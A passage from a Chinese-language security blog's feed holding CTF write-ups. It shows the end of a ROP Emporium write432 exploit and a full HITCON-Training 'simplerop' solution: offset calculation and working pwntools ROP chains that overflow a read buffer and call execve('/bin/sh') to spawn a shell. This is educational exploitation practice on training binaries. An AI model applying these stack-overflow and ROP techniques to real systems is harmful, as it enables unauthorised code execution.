    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss<span class="token operator">+</span>i<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_byte<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1553</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行 </p>
<p><img src="/2018/07/12/ROPEmporium-WriteUp/3.jpg" alt="3"></p>
<p>成功拿到shell</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在看堆系列 最近的wp都是大家有疑惑 我自己也有点不明白的题目 所以再次记录&lt;/p&gt;
&lt;h2 id=&quot;write432&quot;&gt;&lt;a href=&quot;#write432&quot; class=&quot;headerlink&quot; title=&quot;write432&quot;&gt;&lt;/a&gt;write432&lt;/h2&gt;&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HITCON-Training-Writeup</title>
    <link href="http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/"/>
    <id>http://iosmosis.github.io/2018/07/12/HITCON-Training-Writeup/</id>
    <published>2018-07-11T17:09:38.000Z</published>
    <updated>2018-07-12T11:19:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录HITCON题目中遇到的问题</p>
<h2 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h2><h4 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec simplerop
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/simplerop'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre>
<p>开启NX</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token operator">!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">(</span>C<span class="token punctuation">:</span>\Users\TTTR\ios\source\_posts\HITCON<span class="token operator">-</span>Training<span class="token operator">-</span>Writeup\<span class="token number">1</span><span class="token punctuation">.</span>jpg<span class="token punctuation">)</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-14h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ROP is easy is'nt it ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your input :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞很明显存在于read函数 这里限制的读入v4的长度为100</p>
<p>因为此题目属于静态链接libc 理论上可以直接使用ROPgadget生成ropchain进而getshell</p>
<p>先来计算偏移 </p>
<p>gdb在call read处下断</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">b* 0x8048E69
</code></pre>
<p>运行后查看当前esp ebp</p>
<p><img src="/2018/07/12/HITCON-Training-Writeup/1.jpg" alt="1"></p>
<p>计算当前v4的地址</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gef➤  p/x 0xffffd040+0x1c
<span class="token variable">$1</span> <span class="token operator">=</span> 0xffffd05c
</code></pre>
<p>计算v4距离ebp的偏移</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gef➤  p/d 0xffffd078-0xffffd05c
<span class="token variable">$2</span> <span class="token operator">=</span> 28
</code></pre>
<p>所以偏移就该为 28+4=32</p>
<p>那么正常情况下我们就用ROPgadget生成ropchain</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ROPgadget --binary simplerop --ropchain
</code></pre>
<p>得到exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'simplerop'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># Padding goes here</span>
p <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bae06</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">'/bin'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bae06</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">'//sh'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054250</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a15d</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e851</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; pop ebx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding without overwrite ebx</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806e82a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054250</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b27f</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080493e1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>运行你会发现没办法正常getshell 因为可以先print下我们当前payload的长度为168但是raed限制长度为100所以没办法正常写入 ，这时候我们就应该自己去优化这个payload或者自己重新写一个payload</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>寄存器中有eax,ebx,ecx,edx等</p>
<p>Linux下的系统调用通过int 80h实现，用系统调用号来区分入口函数，其中寄存器eax存放调用号，剩下的几个参数存放参数</p>
<p>execve调用号为0xb 所以我们需要找到pop eax ret来将0xb存入eax</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">pop_edx_ret<span class="token operator">=</span><span class="token number">0x0806e82a</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
pop_eax_ret<span class="token operator">=</span><span class="token number">0x080bae06</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span> <span class="token comment" spellcheck="true">#  .data段</span>
pop_edx_ecx_ebx_ret<span class="token operator">=</span><span class="token number">0x0806e850</span> <span class="token comment" spellcheck="true"># pop edx ; pop ecx ; pop ebx ; ret</span>
mov_ret<span class="token operator">=</span><span class="token number">0x0809a15d</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
int_0x80_addr <span class="token operator">=</span> <span class="token number">0x080493e1</span> <span class="token comment" spellcheck="true"># int 0x80</span>
<span class="token comment" spellcheck="true">#因为32位寄存器只能存放0x4字节的数据而"/bin/sh"为7字节所以我们要想办法吧/bin/sh放入data段 然后寄存器放入data段地址</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#先溢出至ret +覆盖ret到edx+将data_addr赋值给edx+覆盖ret到eax+将/bin字符串赋值给eax+利用mov_ret将eax的值赋给edx的值既将/bin覆盖到data段的内容</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#再覆盖ret到edx+将data_addr+4的地址赋值给edx（因为前4字节被赋值为/bin所以要向下+4位地址继续写）+覆盖ret到eax+将/sh\x00写入eax+利用mov_ret将eax的值赋给edx既将/sh\x00覆盖到data+4地址的内容</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token operator">+</span>int_0x80_addr
<span class="token comment" spellcheck="true">#执行系统调用execve 覆盖ret到pop_edx_ecx_ebx_ret+将0赋值给edx+将0赋值给ecx+将data_addr赋值给ebx+将0xb调用号赋值给eax+int 0x80进行中断</span>
</code></pre>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'simplerop'</span><span class="token punctuation">)</span>
pop_edx_ret<span class="token operator">=</span><span class="token number">0x0806e82a</span> 
pop_eax_ret<span class="token operator">=</span><span class="token number">0x080bae06</span> 
data_addr<span class="token operator">=</span><span class="token number">0x080ea060</span>  <span class="token comment" spellcheck="true">#elf.bss()获取</span>
pop_edx_ecx_ebx_ret<span class="token operator">=</span><span class="token number">0x0806e850</span> 
mov_ret<span class="token operator">=</span><span class="token number">0x0809a15d</span> 
int_0x80_addr <span class="token operator">=</span> <span class="token number">0x080493e1</span> 

payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/sh\x00"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>mov_ret<span class="token punctuation">)</span>

payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edx_ecx_ebx_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>pop_eax_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>int_0x80_addr<span class="token punctuation">)</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/12/HITCON-Training-Writeup/2.jpg" alt="2"></p>
<p>可以看到当前payload长度恰好为100可以正常read读入</p>
<p>并且成功获得shell</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录HITCON题目中遇到的问题&lt;/p&gt;
&lt;h2 id=&quot;simplerop&quot;&gt;&lt;a href=&quot;#simplerop&quot; class=&quot;headerlink&quot; title=&quot;simplerop&quot;&gt;&lt;/a&gt;simplerop&lt;/h2&gt;&lt;h4 id=&quot;检查保护&quot;&gt;&lt;a href
    
    </summary>
    
    
  </entry>
  
</feed>
